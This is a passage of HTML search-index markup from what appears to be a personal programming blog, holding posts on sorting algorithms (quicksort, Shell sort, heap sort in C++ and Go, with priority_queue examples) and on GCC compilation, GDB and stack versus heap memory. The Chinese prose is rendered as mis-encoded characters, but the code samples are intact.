&lt;p&gt;å…¶ä¸­ç¬¬2æ­¥æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼Œä¸€ä¸ªç®€å•çš„å®ç°æ–¹æ³•å°±æ˜¯é¢å¤–å¼€ä¸¤ä¸ªæ•°ç»„&lt;code&gt;a&lt;/code&gt;å’Œ&lt;code&gt;b&lt;/code&gt;ï¼Œåœ¨æ‰«æ&lt;code&gt;q&lt;/code&gt;çš„è¿‡ç¨‹ï¼Œå°äºç­‰äº&lt;code&gt;x&lt;/code&gt;çš„æ•°æ”¾å…¥&lt;code&gt;a&lt;/code&gt;ï¼Œå¤§äº&lt;code&gt;x&lt;/code&gt;çš„æ•°æ”¾å…¥&lt;code&gt;b&lt;/code&gt;ï¼Œæœ€åå°†ä¸¤ä¸ªæ•°ç»„åˆå¹¶å°±å¯ä»¥äº†ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void quick_sort(int *arr, int l, int r)
{
    if(l &amp;gt;= r) return;
    
    int x = arr[(l + r) / 2], i = l - 1, j = r + 1;
    
    while(i &amp;lt; j)
    {
        do i++; while(arr[i] &amp;lt; x);
        do j--; while(arr[j] &amp;gt; x);
        if(i &amp;lt; j) swap(arr[i], arr[j]);
    }
    
    quick_sort(arr, l, j);
    quick_sort(arr, j + 1, r);
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;7å¸Œå°”æ’åº&#34;&gt;7.å¸Œå°”æ’åº&lt;/h3&gt;
&lt;p&gt;å¸Œå°”æ’åºå°±æ˜¯å‡çº§ç‰ˆçš„æ’å…¥æ’åºã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void sheSort(int *arr,int n)
{
    int gap=n/2;
    while(gap&amp;gt;=1)
    {
        for(int i=gap; i&amp;lt;n; i++)
        {
            int j=i-gap;
            int tmp=arr[i];
            while(j&amp;gt;=0&amp;amp;&amp;amp;tmp&amp;lt;arr[j])
            {
                arr[j+gap]=arr[j];
                j-=gap;
            }
            arr[j+gap]=tmp;
        }
        gap/=2;
    }
}

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;8å †æ’åº&#34;&gt;8.å †æ’åº&lt;/h3&gt;
&lt;p&gt;https://www.jianshu.com/p/15a29c0ace73&lt;br&gt;
https://www.cnblogs.com/xingyunshizhe/p/11311754.html&lt;/p&gt;
&lt;p&gt;å †æ˜¯ä¸€ç§éçº¿æ€§ç»“æ„ï¼Œè¿‘ä¼¼å®Œå…¨äºŒå‰æ ‘çš„ç»“æ„ï¼Œå¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„å»å­˜å‚¨è¿™ä¸ªæ ‘ç»“æ„ã€‚&lt;br&gt;
æ¯ä¸ªèŠ‚ç‚¹çš„å€¼å¤§äºå…¶å·¦å³å„¿å­å«ä½œå¤§é¡¶å †ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„å€¼å°äºå…¶å·¦å³å„¿å­å«ä½œå°é¡¶å †ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä½¿ç”¨å †çš„åŸå› &#34;&gt;ä½¿ç”¨å †çš„åŸå› &lt;/h4&gt;
&lt;p&gt;å¦‚æœä»…ä»…æ˜¯éœ€è¦å¾—åˆ°ä¸€ä¸ªæœ‰åºçš„åºåˆ—ï¼Œä½¿ç”¨æ’åºå°±å¯ä»¥å¾ˆå¿«å®Œæˆï¼Œå¹¶ä¸éœ€è¦å»ç»„ç»‡ä¸€ä¸ªæ–°çš„æ•°æ®ç»“æ„ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬çš„éœ€æ±‚æ˜¯å¯¹äºä¸€ä¸ªéšæ—¶ä¼šæœ‰æ›´æ–°çš„æ’åºï¼Œæˆ‘è¦éšæ—¶çŸ¥é“è¿™ä¸ªæ’åºçš„æœ€å°å€¼æˆ–æœ€å¤§å€¼æ˜¯ä»€ä¹ˆã€‚&lt;/p&gt;
&lt;h4 id=&#34;cçš„priority_queue&#34;&gt;c++çš„priority_queue&lt;/h4&gt;
&lt;p&gt;c++çš„priority_queueçš„å®ç°æœºåˆ¶å°±æ˜¯ä½¿ç”¨äº†å¤§é¡¶å †æˆ–å°é¡¶å †ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;string&amp;gt;
#include &amp;lt;algorithm&amp;gt;
#include &amp;lt;vector&amp;gt;
#include &amp;lt;map&amp;gt;
#include &amp;lt;unordered_map&amp;gt;
#include &amp;lt;string&amp;gt;
#include &amp;lt;queue&amp;gt;
using namespace std;


/**
é»˜è®¤æ¯”è¾ƒå‡½æ•°ä¸ºless, å¤§é¡¶å †
**/
void defaultCmpLess() {
    cout &amp;lt;&amp;lt; &amp;quot;=========defaultCmpLess(big heap)========&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;int&amp;gt; q;
    for (int i = 0; i &amp;lt; 10; i++) {
        q.push(rand()%20);
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top() &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
        q.pop();
    }
    cout &amp;lt;&amp;lt;endl;

}

/**
ä½¿ç”¨greateræ¯”è¾ƒå‡½æ•°ï¼Œå°é¡¶å †
**/
void useCmpGreater() {
    cout &amp;lt;&amp;lt; &amp;quot;=========useCmpGreater(small heap)========&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;int, vector&amp;lt;int&amp;gt;, greater&amp;lt;int&amp;gt; &amp;gt; q;
    for (int i = 0; i &amp;lt; 10; i++) {
        q.push(rand()%20);
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top() &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
        q.pop();
    }
    cout &amp;lt;&amp;lt;endl;
}


//==========================

struct Node
{
    int x, y;
    Node(int a = 0, int b = 0):x(a), y(b){};
    friend bool operator&amp;lt;(const Node &amp;amp;a, const Node &amp;amp;b);

};
inline bool operator&amp;lt;(const Node &amp;amp;a, const Node &amp;amp;b) {
    if (a.x != b.x)
        return a.x &amp;lt; b.x;
    return a.y &amp;gt; b.y;
}

/**
è¿ç®—ç¬¦é‡è½½
**/
void overloadOperator() {
    cout &amp;lt;&amp;lt; &amp;quot;=========overload Operator&amp;lt; =========&amp;quot; &amp;lt;&amp;lt; endl;
    cout &amp;lt;&amp;lt; &amp;quot;a.x &amp;lt; b.x; a.y &amp;gt; b.y&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;Node&amp;gt; q;
    for (int i = 0; i &amp;lt; 10; i++) {

        q.push( Node( rand()%20, rand()%20 ) );
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top().x &amp;lt;&amp;lt; &amp;quot;,&amp;quot; &amp;lt;&amp;lt; q.top().y &amp;lt;&amp;lt; endl;
        q.pop();
    } 
    cout &amp;lt;&amp;lt; endl;   
}


//=========================
/**
è‡ªæ„å»ºæ¯”è¾ƒå‡½æ•°
**/
struct cmp2
{
    bool operator()(int a, int b) {
        return a &amp;lt; b;
    }
};

void designCmp() {
    cout &amp;lt;&amp;lt; &amp;quot;=========designCmp========&amp;quot; &amp;lt;&amp;lt; endl;
    cout &amp;lt;&amp;lt; &amp;quot;operator a&amp;lt;b&amp;quot; &amp;lt;&amp;lt; endl;
    priority_queue&amp;lt;int, vector&amp;lt;int&amp;gt;, cmp2 &amp;gt; q;

    for (int i = 0; i &amp;lt; 10; i++) {
        q.push(rand()%20);
    }

    while (!q.empty()) {
        cout &amp;lt;&amp;lt; q.top() &amp;lt;&amp;lt; &amp;quot; &amp;quot;;
        q.pop();
    }
    cout &amp;lt;&amp;lt;endl;
}

int main(int argc, char const *argv[])
{   
    defaultCmpLess();
    useCmpGreater();
    overloadOperator();
    designCmp();
}


/**
=========defaultCmpLess(big heap)========
18 18 13 12 10 9 9 7 4 3
=========useCmpGreater(small heap)========
0 0 2 3 5 7 7 9 12 12
=========overload Operator&amp;lt; =========
a.x &amp;lt; b.x; a.y &amp;gt; b.y
19,1
19,9
19,18
17,6
16,15
12,7
10,13
9,17
3,9
0,13

=========designCmp========
operator a&amp;lt;b
17 16 14 13 12 11 8 7 5 5

**/
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;goå®ç°å †æ’åº&#34;&gt;goå®ç°å †æ’åº&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package main

import &amp;quot;fmt&amp;quot;

// Heap å®šä¹‰å †æ’åºè¿‡ç¨‹ä¸­ä½¿ç”¨çš„å †ç»“æ„
type Heap struct {
    arr  []int   // ç”¨æ¥å­˜å‚¨å †çš„æ•°æ®
    size int     // ç”¨æ¥æ ‡è¯†å †çš„å¤§å°
}

// adjustHeap ç”¨äºè°ƒæ•´å †ï¼Œä¿æŒå †çš„å›ºæœ‰æ€§è´¨
func adjustHeap(h Heap, parentNode int) {
    leftNode := parentNode*2 + 1
    rightNode := parentNode*2 + 2

    maxNode := parentNode
    if leftNode &amp;lt; h.size &amp;amp;&amp;amp; h.arr[maxNode] &amp;lt; h.arr[leftNode] {
        maxNode = leftNode
    }
    if rightNode &amp;lt; h.size &amp;amp;&amp;amp; h.arr[maxNode] &amp;lt; h.arr[rightNode] {
        maxNode = rightNode
    }

    if maxNode != parentNode {
        h.arr[maxNode], h.arr[parentNode] = h.arr[parentNode], h.arr[maxNode]
        adjustHeap(h, maxNode)
    }
}

// createHeap ç”¨äºæ„é€ ä¸€ä¸ªå †
func createHeap(arr []int) (h Heap) {
    h.arr = arr
    h.size = len(arr)

    for i := h.size / 2; i &amp;gt;= 0; i-- {
        adjustHeap(h, i)
    }
    return
}

// heapSort ä½¿ç”¨å †å¯¹æ•°ç»„è¿›è¡Œæ’åº
func heapSort(arr []int) {
    h := createHeap(arr)

    for h.size &amp;gt; 0 {
        // å°†æœ€å¤§çš„æ•°å€¼è°ƒæ•´åˆ°å †çš„æœ«å°¾
        h.arr[0], h.arr[h.size-1] = h.arr[h.size-1], h.arr[0]
        // å‡å°‘å †çš„é•¿åº¦
        h.size--
        // ç”±äºå †é¡¶å…ƒç´ æ”¹å˜äº†ï¼Œè€Œä¸”å †çš„å¤§å°æ”¹å˜äº†ï¼Œéœ€è¦é‡æ–°è°ƒæ•´å †ï¼Œç»´æŒå †çš„æ€§è´¨
        adjustHeap(h, 0)
    }
}

func main() {
    // æµ‹è¯•ä»£ç 
    arr := []int{9, 8, 7, 6, 5, 1, 2, 3, 4, 0}
    fmt.Println(arr)
    heapSort(arr)
    fmt.Println(arr)
}
&lt;/code&gt;&lt;/pre&gt;
">ã€ç®—æ³•ã€‘å„ç§æ’åºç®—æ³•</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/cmei-yong-de-xiao-zhi-shi/"" data-c="
          &lt;h2 id=&#34;cç¼–è¯‘å™¨gcc&#34;&gt;C++ç¼–è¯‘å™¨GCC&lt;/h2&gt;
&lt;p&gt;C/C++å¸¸ç”¨çš„ç¼–è¯‘å™¨æ˜¯ç”±GNUå¼€å‘çš„GCC(GNU Compiler Collection)ç¼–è¯‘å™¨ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡GCCç¼–è¯‘å™¨å¯ä»¥å®Œæˆé¢„å¤„ç†ã€ç¼–è¯‘ã€ä¼˜åŒ–ã€é“¾æ¥ï¼Œç”Ÿæˆå¯æ‰§è¡ŒäºŒè¿›åˆ¶ä»£ç ã€‚&lt;/p&gt;
&lt;p&gt;å¸¸ç”¨å‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;gcc test.c -o test
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;ç¼–è¯‘è¿‡ç¨‹&#34;&gt;ç¼–è¯‘è¿‡ç¨‹&lt;/h2&gt;
&lt;p&gt;C/C++&lt;strong&gt;é¢„å¤„ç†&lt;/strong&gt;ã€&lt;strong&gt;ç¼–è¯‘&lt;/strong&gt;ã€&lt;strong&gt;æ±‡ç¼–&lt;/strong&gt;ã€&lt;strong&gt;é“¾æ¥&lt;/strong&gt;å…±éœ€4ä¸ªæ­¥éª¤è½¬æ¢ä¸ºå¯æ‰§è¡Œç¨‹åºã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;.c  --(é¢„å¤„ç†)--&amp;gt;  .i  --(ç¼–è¯‘)--&amp;gt;  .s  --(æ±‡ç¼–)--&amp;gt;  .o --(é“¾æ¥)--&amp;gt;  å¯æ‰§è¡Œç¨‹åº
&lt;/code&gt;&lt;/pre&gt;
&lt;ol&gt;
&lt;li&gt;é¢„å¤„ç†ï¼šå°†å®å®šä¹‰&lt;code&gt;#define&lt;/code&gt;ã€æ¡ä»¶ç¼–è¯‘æŒ‡ä»¤&lt;code&gt;#ifdef/#ifndef/#endif&lt;/code&gt;ã€å¯¼å…¥&lt;code&gt;#include&lt;/code&gt;ç­‰è¿›è¡Œæ›¿æ¢å’Œå¯¼å…¥ï¼Œåˆ é™¤æ³¨é‡Šï¼Œæ·»åŠ è¡Œå·ã€æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œä¿ç•™&lt;code&gt;#pragma&lt;/code&gt;ç¼–è¯‘å™¨æŒ‡ä»¤(.i)ï¼›&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘ï¼šç¼–è¯‘æ˜¯å¯¹ä»£ç è¿›è¡Œè¯æ³•è¯­æ³•åˆ†æå’Œä¼˜åŒ–äº§ç”Ÿæ±‡ç¼–ä»£ç (.s)ï¼›&lt;/li&gt;
&lt;li&gt;æ±‡ç¼–ï¼šæ±‡ç¼–æ˜¯å°†æ±‡ç¼–æŒ‡ä»¤è½¬æ¢æˆæœºå™¨å¯ä»¥è¯†åˆ«çš„äºŒè¿›åˆ¶æœºå™¨æŒ‡ä»¤æ–‡ä»¶(.o)ã€‚&lt;/li&gt;
&lt;li&gt;é“¾æ¥ï¼šé“¾æ¥å°±æ˜¯æŠŠç¼–å†™çš„ç›®æ ‡ä»£ç (.oæ–‡ä»¶)å’Œç³»ç»Ÿæ ‡å‡†å¯åŠ¨ä»£ç ã€åº“ä»£ç è¿™ä¸‰éƒ¨åˆ†åˆå¹¶æˆä¸€ä¸ªæ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ã€‚é™æ€é“¾æ¥æ˜¯åœ¨ç¼–è¯‘é˜¶æ®µå°±æŠŠé™æ€åº“åŠ å…¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­å»ï¼Œè¿™æ ·å¯æ‰§è¡Œæ–‡ä»¶åœ¨æ‰§è¡Œæ—¶å°±ä¸éœ€è¦åœ¨é“¾æ¥åº“æ–‡ä»¶ï¼Œä½†å¯æ‰§è¡Œæ–‡ä»¶å°±æ¯”è¾ƒå¤§ï¼›åŠ¨æ€é“¾æ¥åœ¨é“¾æ¥é˜¶æ®µåªåŠ å…¥ä¸€äº›æè¿°ä¿¡æ¯ï¼Œè€Œç¨‹åºæ‰§è¡Œæ—¶å†æŠŠç›¸åº”åŠ¨æ€åº“åŠ è½½åˆ°å†…å­˜ä¸­å»ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657115499922.jpg&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h2 id=&#34;ç¼–è¯‘å‹-è§£é‡Šå‹è¯­è¨€&#34;&gt;ç¼–è¯‘å‹ã€è§£é‡Šå‹è¯­è¨€&lt;/h2&gt;
&lt;h3 id=&#34;ç¼–è¯‘å‹è¯­è¨€&#34;&gt;ç¼–è¯‘å‹è¯­è¨€&lt;/h3&gt;
&lt;p&gt;éœ€è¦é€šè¿‡ç¼–è¯‘å™¨å°†æºä»£ç ç¼–è¯‘æˆæœºå™¨ç ï¼Œä¹‹åæ‰èƒ½æ‰§è¡Œçš„è¯­è¨€ã€‚ä¸€èˆ¬éœ€ç»è¿‡ç¼–è¯‘ã€é“¾æ¥è¿™ä¸¤ä¸ªæ­¥éª¤ã€‚ç¼–è¯‘æ—¶æŠŠæºä»£ç ç¼–è¯‘æˆæœºå™¨ç ï¼Œé“¾æ¥æ—¶æŠŠå„ä¸ªæ¨¡å—çš„æœºå™¨ç å’Œä¾èµ–åº“ä¸²è”èµ·æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¼˜ç‚¹ï¼š&lt;/strong&gt; ç¼–è¯‘ä¸€æ¬¡ï¼Œè¿è¡Œæ—¶ä¸éœ€è¦ç¼–è¯‘ï¼Œæ‰€ä»¥æ‰§è¡Œæ•ˆç‡é«˜ï¼Œå¯ä»¥è„±ç¦»è¯­è¨€ç¯å¢ƒç‹¬ç«‹è¿è¡Œï¼ˆå› ä¸ºå·²ç»ç¼–è¯‘æˆäº†åŸºäºæ­¤æœºå™¨ç³»ç»Ÿçš„æœºå™¨æŒ‡ä»¤ç ï¼‰ã€‚å¤§éƒ¨åˆ†è½¯ä»¶äº§å“éƒ½æ˜¯ä»¥ç›®æ ‡ç¨‹åºå½¢å¼å‘è¡Œç»™ç”¨æˆ·ï¼Œä¸ä»…ä¾¿äºç›´æ¥æ‰§è¡Œï¼Œè€Œä¸”åˆä½¿å¾—ä»–äººéš¾ä»¥ç›—ç”¨å…¶ä¸­çš„æŠ€æœ¯ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¼ºç‚¹ï¼š&lt;/strong&gt; ç¼–è¯‘ä¹‹åå¦‚æœéœ€è¦ä¿®æ”¹åˆ™éœ€è¦å†æ¬¡ç¼–è¯‘ï¼Œç”±äºç¼–è¯‘æ‰§è¡Œçš„è¯­è¨€ç›´æ¥è·ŸCPUçš„æŒ‡ä»¤é›†æ‰“äº¤é“ï¼Œå…·æœ‰å¾ˆå¼ºçš„æŒ‡ä»¤ä¾èµ–æ€§å’Œç³»ç»Ÿä¾èµ–æ€§ï¼Œå› æ­¤åœ¨ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´ç§»æ¤ä¼šå‡ºç°é—®é¢˜ï¼Œéœ€è¦æ ¹æ®è¿è¡Œçš„æ“ä½œç³»ç»Ÿç¯å¢ƒç¼–è¯‘ä¸åŒçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä»£è¡¨è¯­è¨€ï¼š&lt;/strong&gt; Cã€C++ã€Pascalã€Object-C&lt;/p&gt;
&lt;h3 id=&#34;è§£é‡Šå‹è¯­è¨€&#34;&gt;è§£é‡Šå‹è¯­è¨€&lt;/h3&gt;
&lt;p&gt;è§£é‡Šå‹è¯­è¨€çš„ç¨‹åºä¸éœ€è¦ç¼–è¯‘ï¼Œç›¸æ¯”ç¼–è¯‘å‹è¯­è¨€çœäº†é“å·¥åºï¼Œè§£é‡Šå‹è¯­è¨€åœ¨è¿è¡Œç¨‹åºæ—¶æ‰é€è¡Œè¿›è¡Œç¿»è¯‘ã€‚ï¼ˆè¾¹æ‰§è¡Œè¾¹ç¿»è¯‘ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä¼˜ç‚¹ï¼š&lt;/strong&gt; æœ‰è‰¯å¥½çš„å¹³å°å…¼å®¹æ€§ï¼Œåœ¨ä»»ä½•ç¯å¢ƒä¸­éƒ½å¯ä»¥è¿è¡Œï¼Œå‰ææ˜¯å®‰è£…äº†è§£é‡Šå™¨ï¼ˆè™šæ‹Ÿæœºï¼‰ã€‚çµæ´»ï¼Œä¿®æ”¹ä»£ç çš„æ—¶å€™ç›´æ¥ä¿®æ”¹å°±å¯ä»¥ï¼Œå¯ä»¥å¿«é€Ÿéƒ¨ç½²ï¼Œä¸ç”¨åœæœºç»´æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ç¼ºç‚¹ï¼š&lt;/strong&gt; æ¯æ¬¡è¿è¡Œçš„æ—¶å€™éƒ½è¦è§£é‡Šä¸€éï¼Œå› æ­¤è¿è¡Œé€Ÿåº¦ä¼šç¨æ…¢ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ä»£è¡¨è¯­è¨€ï¼š&lt;/strong&gt; JavaScriptã€Pythonã€Erlangã€PHPã€Perlã€Ruby&lt;/p&gt;
&lt;p&gt;è„šæœ¬è¯­è¨€æ˜¯è§£é‡Šå‹è¯­è¨€ã€‚&lt;/p&gt;
&lt;h3 id=&#34;æ··åˆå‹è¯­è¨€&#34;&gt;æ··åˆå‹è¯­è¨€&lt;/h3&gt;
&lt;p&gt;æ··åˆå‹è¯­è¨€åœ¨ç¼–è¯‘çš„æ—¶å€™ä¸æ˜¯ç›´æ¥ç¼–è¯‘æˆæœºå™¨ç ï¼Œè€Œæ˜¯ä¸­é—´ç ã€‚&lt;br&gt;
ä¾‹å¦‚javaå°†ç¨‹åºç¿»è¯‘æˆä¸€ç§ä¸­é—´ä»£ç å­—èŠ‚ç ï¼Œå¯ä»¥è¢«javaè§£é‡Šå™¨è§£é‡Šçš„ç‹¬ç«‹äºå¹³å°çš„ä»£ç ã€‚é€šè¿‡è§£é‡Šå™¨ï¼Œæ¯æ¡javaå­—èŠ‚æŒ‡ä»¤è¢«åˆ†æï¼Œç„¶åè¿è¡Œåœ¨è®¡ç®—æœºä¸Šã€‚åªéœ€ç¼–è¯‘ä¸€æ¬¡ï¼Œç¨‹åºè¿è¡Œæ—¶è§£é‡Šæ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;å¯ä»¥æŠŠjavaå­—èŠ‚ç çœ‹ä½œè¿è¡Œåœ¨javaè™šæ‹Ÿæœºä¸Šçš„æœºå™¨ä»£ç æŒ‡ä»¤ã€‚æ¯ç§javaè§£é‡Šå™¨ï¼Œä¸ç®¡æ˜¯java å¼€å‘å·¥å…·è¿˜æ˜¯å¯ä»¥è¿è¡Œjavaå°åº”ç”¨ç¨‹åºçš„webæµè§ˆå™¨ï¼Œéƒ½æ˜¯ä¸€ç§java VMçš„å®ä¾‹ï¼Œjava VMä¹Ÿå¯ä»¥ç”±ç¡¬ä»¶å®ç°ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬éƒ½çŸ¥é“javaè¯­è¨€ä¸€ä¸ªéå¸¸é‡è¦çš„ç‰¹ç‚¹æ˜¯ä¸å¹³å°æ— å…³æ€§ï¼Œè€Œjava VMæ˜¯å®ç°è¿™ä¸€ç‰¹ç‚¹çš„å…³é”®ã€‚&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;gdbè°ƒè¯•å·¥å…·&#34;&gt;GDBè°ƒè¯•å·¥å…·&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨GDBè°ƒè¯•å¯æ‰§è¡Œç¨‹åºï¼Œéœ€è¦åœ¨ç¨‹åºç¼–è¯‘æ—¶ä½¿ç”¨å¸¦&lt;code&gt;-g&lt;/code&gt;çš„å‚æ•°ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;gcc -g test.c -o test

# è°ƒè¯•ï¼Œä¼šå‡ºç°ä»¥ä¸‹æç¤º
gdb test
GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-120.el7
Copyright (C) 2013 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;
and &amp;quot;show warranty&amp;quot; for details.
This GDB was configured as &amp;quot;x86_64-redhat-linux-gnu&amp;quot;.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;...
Reading symbols from /root/test...done.
(gdb)
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;h2 id=&#34;å †å’Œæ ˆçš„åŒºåˆ«&#34;&gt;å †å’Œæ ˆçš„åŒºåˆ«&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;å†…å­˜åˆ†é…&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸€ä¸ªç”±C/C++ç¼–è¯‘çš„ç¨‹åºå ç”¨çš„å†…å­˜åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;æ ˆåŒºstackï¼šç”±ç¼–è¯‘å™¨è‡ªåŠ¨åˆ†é…é‡Šæ”¾ï¼Œå­˜æ”¾å‡½æ•°çš„å‚æ•°å€¼ï¼Œå±€éƒ¨å˜é‡ç­‰ï¼Œå…¶æ“ä½œæ–¹å¼ç±»ä¼¼äºæ•°æ®ç»“æ„ä¸­çš„æ ˆã€‚ç®€å•æ¥è¯´å°±æ˜¯ç¨‹åºè¿è¡Œè€Œä¸´æ—¶å ç”¨çš„åŒºåŸŸç©ºé—´ã€‚&lt;/li&gt;
&lt;li&gt;å †åŒºheapï¼šä¸€èˆ¬ç”±ç¨‹åºå‘˜åˆ†é…é‡Šæ”¾ï¼Œè‹¥ç¨‹åºå‘˜ä¸é‡Šæ”¾ï¼Œç¨‹åºç»“æŸæ—¶å¯èƒ½ç”±OSå›æ”¶ã€‚ä¸æ•°æ®ç»“æ„çš„å †æ˜¯ä¸¤å›äº‹ã€‚åˆ†é…æ–¹å¼ç±»ä¼¼äºé“¾è¡¨ã€‚&lt;/li&gt;
&lt;li&gt;å…¨å±€åŒºï¼ˆé™æ€åŒºï¼‰staticï¼šå…¨å±€å˜é‡å’Œé™æ€å˜é‡çš„å­˜å‚¨æ˜¯æ”¾åœ¨ä¸€èµ·çš„ï¼Œåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡åœ¨ä¸€å—åŒºåŸŸï¼Œæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œæœªåˆå§‹åŒ–çš„é™æ€å˜é‡åœ¨ç›¸é‚»çš„å¦ä¸€å—åŒºåŸŸï¼Œç¨‹åºç»“æŸåç”±ç³»ç»Ÿé‡Šæ”¾ã€‚&lt;/li&gt;
&lt;li&gt;æ–‡å­—å¸¸é‡åŒºï¼šå¸¸é‡å­—ç¬¦ä¸²å°±æ˜¯å­˜æ”¾åœ¨è¿™é‡Œã€‚ç¨‹åºç»“æŸåç”±ç³»ç»Ÿé‡Šæ”¾ã€‚&lt;/li&gt;
&lt;li&gt;ç¨‹åºä»£ç åŒºï¼šå­˜æ”¾åœ¨å‡½æ•°ä½“çš„äºŒè¿›åˆ¶ä»£ç ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;int a = 0; // å…¨å±€åˆå§‹åŒ–åŒº
char *p1; // å…¨å±€æœªåˆå§‹åŒ–åŒº    
main()    
{    
    int b; // æ ˆ    
    char s[] = &amp;quot;abc&amp;quot;; // æ ˆ    
    char *p2; // æ ˆ    
    char *p3 = &amp;quot;123456&amp;quot;; // 123456/0åœ¨å¸¸é‡åŒºï¼Œp3åœ¨æ ˆä¸Šã€‚    
    static int c = 0; // å…¨å±€ï¼ˆé™æ€ï¼‰åˆå§‹åŒ–åŒº    
    p1 = (char *)malloc(10);    
    p2 = (char *)malloc(20);    
    p3 = new char[10];
    // p1p2p3åˆ†é…å¾—æ¥å¾—10å’Œ20å­—èŠ‚çš„åŒºåŸŸå°±åœ¨å †åŒºã€‚    
    strcpy(p1, &amp;quot;123456&amp;quot;); // 123456/0æ”¾åœ¨å¸¸é‡åŒºï¼Œç¼–è¯‘å™¨å¯èƒ½ä¼šå°†å®ƒä¸p3æ‰€æŒ‡å‘çš„&amp;quot;123456&amp;quot;ä¼˜åŒ–æˆä¸€ä¸ªåœ°æ–¹.
}  
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;å †æ ˆå†…å­˜æ¨¡å‹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. å †&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œæ“ä½œç³»ç»Ÿä¼šç»™å®ƒåˆ†é…ä¸€æ®µå†…å­˜ï¼Œç”¨æ¥å‚¨å­˜ç¨‹åºå’Œè¿è¡Œäº§ç”Ÿçš„æ•°æ®ã€‚è¿™æ®µå†…å­˜æœ‰èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€ï¼Œæ¯”å¦‚ä»0x1000åˆ°0x8000ï¼Œèµ·å§‹åœ°å€æ˜¯è¾ƒå°çš„é‚£ä¸ªåœ°å€ï¼Œç»“æŸåœ°å€æ˜¯è¾ƒå¤§çš„é‚£ä¸ªåœ°å€ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1629769772888.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
